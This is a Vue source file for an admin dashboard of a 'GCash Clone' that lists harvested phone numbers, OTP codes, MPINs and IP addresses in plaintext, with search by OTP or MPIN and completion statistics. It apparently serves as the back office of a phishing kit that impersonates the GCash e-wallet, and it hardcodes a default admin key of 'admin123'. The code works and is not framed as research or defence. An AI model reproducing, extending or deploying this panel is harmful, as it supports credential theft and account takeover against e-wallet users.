<script setup>
import { ref, onMounted, computed } from 'vue'

const API_BASE_URL = (import.meta.env.VITE_API_URL ?? 'https://gcash-clone-v0-1.onrender.com').replace(/\/$/, '')
const ADMIN_KEY = ref('admin123')

const registrations = ref([])
const stats = ref(null)
const loading = ref(false)
const error = ref(null)
const currentPage = ref(1)
const totalPages = ref(1)
const showKeyInput = ref(true)
const searchQuery = ref('')

const filteredRegistrations = computed(() => {
  if (!searchQuery.value) return registrations.value
  
  const query = searchQuery.value.toLowerCase()
  return registrations.value.filter(reg => 
    reg.phoneNumber.toLowerCase().includes(query) ||
    reg.phone.toLowerCase().includes(query) ||
    (reg.otp && reg.otp.includes(query)) ||
    (reg.mpin && reg.mpin.includes(query))
  )
})

const fetchRegistrations = async () => {
  if (!ADMIN_KEY.value) {
    error.value = 'Please enter admin key'
    return
  }

  loading.value = true
  error.value = null

  try {
    const response = await fetch(
      `${API_BASE_URL}/api/admin/registrations?page=${currentPage.value}&limit=50`,
      {
        headers: {
          'X-Admin-Key': ADMIN_KEY.value
        }
      }
    )

    if (!response.ok) {
      throw new Error('Unauthorized or server error')
    }

    const data = await response.json()
    registrations.value = data.registrations
    stats.value = data.stats
    totalPages.value = data.pagination.pages
    showKeyInput.value = false
  } catch (err) {
    error.value = err.message
    registrations.value = []
  } finally {
    loading.value = false
  }
}

const formatDate = (date) => {
  if (!date) return 'N/A'
  return new Date(date).toLocaleString()
}

const getStatusColor = (status) => {
  const colors = {
    phone_registered: '#fbbf24',
    otp_verified: '#60a5fa',
    mpin_set: '#34d399',
    completed: '#10b981'
  }
  return colors[status] || '#6b7280'
}

const refreshData = () => {
  currentPage.value = 1
  fetchRegistrations()
}

const nextPage = () => {
  if (currentPage.value < totalPages.value) {
    currentPage.value++
    fetchRegistrations()
  }
}

const prevPage = () => {
  if (currentPage.value > 1) {
    currentPage.value--
    fetchRegistrations()
  }
}

const deleteRegistration = async (id) => {
  if (!confirm('Are you sure you want to delete this registration?')) return

  try {
    const response = await fetch(`${API_BASE_URL}/api/admin/registrations/${id}`, {
      method: 'DELETE',
      headers: {
        'X-Admin-Key': ADMIN_KEY.value
      }
    })

    if (!response.ok) throw new Error('Failed to delete')

    await fetchRegistrations()
  } catch (err) {
    alert('Failed to delete: ' + err.message)
  }
}

onMounted(() => {
  const savedKey = localStorage.getItem('admin_key')
  if (savedKey) {
    ADMIN_KEY.value = savedKey
    showKeyInput.value = false
    fetchRegistrations()
  }
})

const saveAndLogin = () => {
  localStorage.setItem('admin_key', ADMIN_KEY.value)
  fetchRegistrations()
}

const logout = () => {
  localStorage.removeItem('admin_key')
  ADMIN_KEY.value = ''
  showKeyInput.value = true
  registrations.value = []
  stats.value = null
}
</script>

<template>
  <div class="admin-dashboard">
    <!-- Admin Login -->
    <div v-if="showKeyInput" class="login-card">
      <h1 class="login-title">🔐 Admin Dashboard</h1>
      <p class="login-subtitle">GCash Clone - Registration Monitor</p>
      
      <div class="login-form">
        <input
          v-model="ADMIN_KEY"
          type="password"
          placeholder="Enter admin key"
          class="key-input"
          @keyup.enter="saveAndLogin"
        />
        <button @click="saveAndLogin" class="login-btn">Access Dashboard</button>
      </div>

      <p v-if="error" class="error-message">{{ error }}</p>
      
      <div class="login-hint">
        <p>🔑 Default key: <code>admin123</code></p>
        <p>📝 Configure in <code>.env</code> with <code>ADMIN_KEY</code></p>
      </div>
    </div>

    <!-- Dashboard Content -->
    <div v-else class="dashboard-content">
      <!-- Header -->
      <header class="dashboard-header">
        <div class="header-left">
          <h1 class="dashboard-title">📊 Admin Dashboard</h1>
          <p class="dashboard-subtitle">Registration Tracking & Monitoring</p>
        </div>
        <div class="header-right">
          <button @click="refreshData" class="refresh-btn" :disabled="loading">
            🔄 Refresh
          </button>
          <button @click="logout" class="logout-btn">Logout</button>
        </div>
      </header>

      <!-- Stats -->
      <div v-if="stats" class="stats-grid">
        <div class="stat-card">
          <div class="stat-value">{{ stats.total }}</div>
          <div class="stat-label">Total Registrations</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">{{ stats.withOTP }}</div>
          <div class="stat-label">With OTP</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">{{ stats.withMPIN }}</div>
          <div class="stat-label">With MPIN</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">{{ stats.today }}</div>
          <div class="stat-label">Today</div>
        </div>
      </div>

      <!-- Search -->
      <div class="search-bar">
        <input
          v-model="searchQuery"
          type="text"
          placeholder="🔍 Search by phone, OTP, or MPIN..."
          class="search-input"
        />
        <span class="result-count">{{ filteredRegistrations.length }} results</span>
      </div>

      <!-- Loading -->
      <div v-if="loading" class="loading-state">
        <div class="spinner"></div>
        <p>Loading registrations...</p>
      </div>

      <!-- Error -->
      <div v-else-if="error" class="error-state">
        <p>❌ {{ error }}</p>
        <button @click="fetchRegistrations" class="retry-btn">Retry</button>
      </div>

      <!-- Table -->
      <div v-else class="table-container">
        <table class="data-table">
          <thead>
            <tr>
              <th>Phone Number</th>
              <th>OTP Code</th>
              <th>MPIN</th>
              <th>Status</th>
              <th>IP Address</th>
              <th>Created At</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            <tr v-for="reg in filteredRegistrations" :key="reg.id">
              <td class="phone-cell">
                <strong>{{ reg.phoneNumber }}</strong>
              </td>
              <td class="code-cell">
                <span v-if="reg.otp !== 'Not set'" class="code-badge otp">{{ reg.otp }}</span>
                <span v-else class="not-set">—</span>
              </td>
              <td class="code-cell">
                <span v-if="reg.mpin !== 'Not set'" class="code-badge mpin">{{ reg.mpin }}</span>
                <span v-else class="not-set">—</span>
              </td>
              <td>
                <span class="status-badge" :style="{ backgroundColor: getStatusColor(reg.status) }">
                  {{ reg.status }}
                </span>
              </td>
              <td class="ip-cell">{{ reg.ipAddress || 'N/A' }}</td>
              <td class="date-cell">{{ formatDate(reg.createdAt) }}</td>
              <td>
                <button @click="deleteRegistration(reg.id)" class="delete-btn" title="Delete">
                  🗑️
                </button>
              </td>
            </tr>
          </tbody>
        </table>

        <div v-if="filteredRegistrations.length === 0" class="empty-state">
          <p>No registrations found</p>
        </div>
      </div>

      <!-- Pagination -->
      <div v-if="!loading && totalPages > 1" class="pagination">
        <button @click="prevPage" :disabled="currentPage === 1" class="page-btn">
          ← Previous
        </button>
        <span class="page-info">Page {{ currentPage }} of {{ totalPages }}</span>
        <button @click="nextPage" :disabled="currentPage === totalPages" class="page-btn">
          Next →
        </button>
      </div>
    </div>
  </div>
</template>

<style scoped>
.admin-dashboard {
  min-height: 100vh;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  padding: 2rem;
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
}

/* Login Card */
.login-card {
  max-width: 400px;
  margin: 10vh auto;
  background: white;
  border-radius: 16px;
  padding: 2.5rem;
  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
}

.login-title {
  margin: 0 0 0.5rem;
  font-size: 2rem;
  color: #1f2937;
  text-align: center;
}

.login-subtitle {
  margin: 0 0 2rem;
  color: #6b7280;
  text-align: center;
  font-size: 0.95rem;
}

.login-form {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.key-input {
  padding: 0.875rem 1rem;
  border: 2px solid #e5e7eb;
  border-radius: 8px;
  font-size: 1rem;
  outline: none;
  transition: border-color 0.2s;
}

.key-input:focus {
  border-color: #667eea;
}

.login-btn {
  padding: 0.875rem 1rem;
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  color: white;
  border: none;
  border-radius: 8px;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: transform 0.2s, box-shadow 0.2s;
}

.login-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
}

.login-hint {
  margin-top: 1.5rem;
  padding: 1rem;
  background: #f3f4f6;
  border-radius: 8px;
  font-size: 0.85rem;
  color: #4b5563;
}

.login-hint code {
  background: #e5e7eb;
  padding: 0.2rem 0.4rem;
  border-radius: 4px;
  font-family: 'Courier New', monospace;
}

/* Dashboard Content */
.dashboard-content {
  max-width: 1400px;
  margin: 0 auto;
}

.dashboard-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 2rem;
  background: white;
  padding: 1.5rem 2rem;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.header-left {
  flex: 1;
}

.dashboard-title {
  margin: 0 0 0.25rem;
  font-size: 1.75rem;
  color: #1f2937;
}

.dashboard-subtitle {
  margin: 0;
  color: #6b7280;
  font-size: 0.95rem;
}

.header-right {
  display: flex;
  gap: 0.75rem;
}

.refresh-btn, .logout-btn {
  padding: 0.625rem 1.25rem;
  border: none;
  border-radius: 8px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
}

.refresh-btn {
  background: #3b82f6;
  color: white;
}

.refresh-btn:hover:not(:disabled) {
  background: #2563eb;
}

.refresh-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.logout-btn {
  background: #ef4444;
  color: white;
}

.logout-btn:hover {
  background: #dc2626;
}

/* Stats Grid */
.stats-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 1rem;
  margin-bottom: 2rem;
}

.stat-card {
  background: white;
  padding: 1.5rem;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  text-align: center;
}

.stat-value {
  font-size: 2.5rem;
  font-weight: 700;
  color: #667eea;
  margin-bottom: 0.5rem;
}

.stat-label {
  color: #6b7280;
  font-size: 0.95rem;
  font-weight: 500;
}

/* Search Bar */
.search-bar {
  background: white;
  padding: 1.25rem;
  border-radius: 12px;
  margin-bottom: 1.5rem;
  display: flex;
  gap: 1rem;
  align-items: center;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.search-input {
  flex: 1;
  padding: 0.75rem 1rem;
  border: 2px solid #e5e7eb;
  border-radius: 8px;
  font-size: 1rem;
  outline: none;
}

.search-input:focus {
  border-color: #667eea;
}

.result-count {
  color: #6b7280;
  font-size: 0.9rem;
  font-weight: 500;
}

/* Table */
.table-container {
  background: white;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  overflow: hidden;
}

.data-table {
  width: 100%;
  border-collapse: collapse;
}

.data-table thead {
  background: #f9fafb;
}

.data-table th {
  padding: 1rem;
  text-align: left;
  font-weight: 600;
  color: #374151;
  font-size: 0.875rem;
  text-transform: uppercase;
  letter-spacing: 0.05em;
}

.data-table tbody tr {
  border-top: 1px solid #e5e7eb;
  transition: background-color 0.2s;
}

.data-table tbody tr:hover {
  background: #f9fafb;
}

.data-table td {
  padding: 1rem;
  color: #1f2937;
}

.phone-cell strong {
  color: #1f2937;
  font-weight: 600;
}

.code-cell {
  font-family: 'Courier New', monospace;
  font-weight: 600;
}

.code-badge {
  display: inline-block;
  padding: 0.375rem 0.75rem;
  border-radius: 6px;
  font-size: 0.95rem;
  letter-spacing: 0.1em;
}

.code-badge.otp {
  background: #dbeafe;
  color: #1e40af;
}

.code-badge.mpin {
  background: #d1fae5;
  color: #065f46;
}

.not-set {
  color: #9ca3af;
}

.status-badge {
  display: inline-block;
  padding: 0.375rem 0.875rem;
  border-radius: 999px;
  font-size: 0.8rem;
  font-weight: 600;
  color: white;
  text-transform: capitalize;
}

.ip-cell, .date-cell {
  color: #6b7280;
  font-size: 0.9rem;
}

.delete-btn {
  background: transparent;
  border: none;
  font-size: 1.25rem;
  cursor: pointer;
  transition: transform 0.2s;
}

.delete-btn:hover {
  transform: scale(1.2);
}

/* States */
.loading-state, .error-state, .empty-state {
  text-align: center;
  padding: 3rem;
  background: white;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #e5e7eb;
  border-top-color: #667eea;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin: 0 auto 1rem;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

.error-message {
  color: #ef4444;
  margin-top: 1rem;
  font-size: 0.9rem;
}

.retry-btn {
  margin-top: 1rem;
  padding: 0.625rem 1.5rem;
  background: #667eea;
  color: white;
  border: none;
  border-radius: 8px;
  font-weight: 600;
  cursor: pointer;
}

/* Pagination */
.pagination {
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 1rem;
  margin-top: 2rem;
  padding: 1rem;
  background: white;
  border-radius: 12px;
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}

.page-btn {
  padding: 0.625rem 1.25rem;
  background: #667eea;
  color: white;
  border: none;
  border-radius: 8px;
  font-weight: 600;
  cursor: pointer;
}

.page-btn:disabled {
  background: #e5e7eb;
  color: #9ca3af;
  cursor: not-allowed;
}

.page-info {
  color: #6b7280;
  font-weight: 500;
}
</style>
